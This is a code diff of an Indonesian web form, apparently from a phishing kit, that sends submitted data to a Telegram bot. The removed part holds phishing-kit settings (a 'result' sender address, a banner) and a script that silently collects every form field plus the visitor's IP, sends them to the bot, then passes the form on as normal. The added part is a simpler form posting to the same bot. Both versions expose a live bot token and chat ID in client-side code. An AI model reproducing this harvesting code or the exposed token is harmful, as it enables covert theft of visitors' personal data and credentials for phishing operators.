@@ -1,35 +1,51 @@
-<!-- Converted from PHP to static HTML -->
-<?php
-// GANTI EMAIL KAMU DISINI
-$my_email = 'umail@gmail.com'; 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulir ke Telegram</title>
+</head>
+<body>
+  <form id="myForm">
+    <input type="text" name="nama" placeholder="Nama" required>
+    <input type="email" name="email" placeholder="Email" required>
+    <textarea name="pesan" placeholder="Pesan" required></textarea>
+    <button type="submit">Kirim</button>
+  </form>
 
-// GANTI BANNER KAMU DISINI
-$banner = 'https://i.ibb.co.com/yd5ky5M/SS.jpg';
+  <script>
+    document.getElementById('myForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-// GANTI NAMA SENDER KAMU DISINI
-$sender = 'From: ITS ME GALIH <GALIH@ressult.top>';
-?>
-<script>
-document.querySelector("form").addEventListener("submit", async function(e) {
-  e.preventDefault();
+      const token = '8179867554:AAELDuXYnYfykvCvlDx-FJxWzWkdxOxFbOs';
+      const chat_id = '6936723956';
+      const nama = this.nama.value;
+      const email = this.email.value;
+      const pesan = this.pesan.value;
 
-  const formData = new FormData(this);
-  const entries = Array.from(formData.entries()).map(([k, v]) => k + ": " + v).join("\n");
-  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(d => d.ip);
+      const message = `Nama: ${nama}\nEmail: ${email}\nPesan: ${pesan}`;
 
-  const message = "Data Form Masuk:\n" + entries + "\nIP: " + ip;
-
-  await fetch("https://api.telegram.org/bot8179867554:AAELDuXYnYfykvCvlDx-FJxWzWkdxOxFbOs/sendMessage", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: "6936723956",
-      text: message
-    })
-  });
-
-  this.submit(); // Lanjutkan ke action form aslinya jika perlu
-});
-</script>
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('Pesan berhasil dikirim!');
+        } else {
+          alert('Terjadi kesalahan: ' + data.description);
+        }
+      })
+      .catch(error => {
+        alert('Terjadi kesalahan: ' + error.message);
+      });
+    });
+  </script>
+</body>
+</html>
